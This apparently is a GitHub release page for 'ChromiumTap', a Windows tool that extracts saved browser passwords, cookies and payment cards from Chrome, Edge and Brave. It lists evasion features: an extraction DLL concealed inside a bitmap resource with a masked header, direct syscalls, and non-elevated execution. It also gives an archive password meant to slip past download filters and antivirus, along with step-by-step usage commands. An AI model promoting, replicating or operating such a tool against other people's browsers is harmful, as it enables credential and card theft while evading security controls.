# ChromiumTap 1.0.1 — Zero-CRT Single-Binary Browser Credential, Cookie & Payment Vault Inspector

ChromiumTap is a native C++23 and MASM x64 browser credential, cookie, and payment card recovery tool for Windows x64, packaged into a single `296,448`-byte standalone executable with zero CRT dependencies.

## Carrier & Architecture — 14.11.2026

- The `ChromiumTap.dll` extraction module is embedded inside a native Windows `RT_BITMAP 2001` resource (`resources/wallpaper.bmp`, 24-bit `104 × 100` px) rather than shipped as a separate DLL on disk.
- The `0x80`-byte DOS header of `ChromiumTap.dll` is stripped at build time, packed into an `IMPL0003` v3 container, LZX-compressed into a Cabinet stream, and masked at the `MSCF` signature (`{0xA5, 0x5A, 0xF0, 0x0F}`).
- At runtime, `EmbeddedModule` unpacks the stream in memory via `cabinet.dll` FDI, reconstructs the DOS stub from `%SystemRoot%\System32\drivers\ks.sys`, verifies SHA-256 digests through Windows CNG (`bcrypt.dll`) before and after reconstruction, and stages the image to a `FILE_FLAG_DELETE_ON_CLOSE` temporary file.
- Runs from a standard, non-elevated user account (Zero-UAC): same-SID Medium Integrity Level ownership, `%LOCALAPPDATA%` DPAPI locality, and browser `IElevator` COM validation require no Administrator token.

> ## 🔑 Archive Password: `github.com`
>
> **Password required to extract `ChromiumTap.7z`:** `github.com`
> Encrypted with password `github.com` to prevent browser download filters and antivirus false positives on direct-syscall and process-inspection binaries.

---

## How to Use

1. Download `ChromiumTap.7z` and extract it using password `github.com`.
2. **Graphical Interface:** Launch `ChromiumTap.exe` without arguments from a standard user account:
   * Select target scope: `All Browsers`, `Chrome`, `Edge`, or `Brave`.
   * Configure output directory via **Browse…** (`Ctrl+O`), toggle **Verbose Mode**, and click **Start Extraction** (`Ctrl+E`).
   * Switch between **English** and **Polish** at runtime under **View → Language** (125 embedded `STRINGTABLE` keys).
3. **Command Line Interface:**
   * `ChromiumTap.exe all -v` — Extract from all detected browsers with verbose diagnostics.
   * `ChromiumTap.exe chrome -o C:\Reports\Audit` — Target Google Chrome and write JSON/CSV reports to a custom directory.
   * `ChromiumTap.exe edge --verbose` — Target Microsoft Edge with full diagnostic telemetry.
   * `ChromiumTap.exe --help` — Display command-line usage.

---

## Key Technical Highlights

* **Zero-CRT Freestanding C++23:** Compiled with `/NODEFAULTLIB`, `/GS-`, `/EHa-`, `/GR-`, `/W4 /WX` — zero CRT imports, zero CRT symbols, `GetProcessHeap()` allocation backing.
* **Direct x64 Syscalls:** Runtime `ntdll.dll` SSN and `syscall; ret` gadget resolution (`support/syscalls.cpp`) paired with an x64 MASM trampoline (`support/AbiTramp.asm`).
* **Cryptographic Coverage:** App-Bound Encryption (`v20`) via browser `IElevator` COM interfaces, Edge split-key DPAPI fallback, and AES-256-GCM via Windows CNG (`bcrypt.lib`).
* **Overlapped Named-Pipe IPC:** `OVERLAPPED` I/O with `WaitForMultipleObjects` and `CancelIoEx` cancellation, plus structured `DiagnosticEvent` wire framing (`15000+`) localized identically across GUI and CLI.
* **Direct2D on Windows 11 Mica:** Per-Monitor V2 DPI scaling, hardware-accelerated Direct2D/DirectWrite rendering, High Contrast fallback, and RAII resource guards (`gui/Handle.h`).

---

## Release Assets

| File | Format | Contents | Size | SHA-256 Digest |
|---|---|---|---|---|
| `ChromiumTap.7z` | 7-Zip AES-256 | `ChromiumTap.exe` (`296,448` B standalone) | 126,434 bytes (124 KiB) | `59691c9782ab6c40e840deb80e5865f37a32a2b79afc61fe199a04eb3d786649` |

---

**© 2026 Marek Wesołowski — [WESMAR](https://github.com/wesmar)**
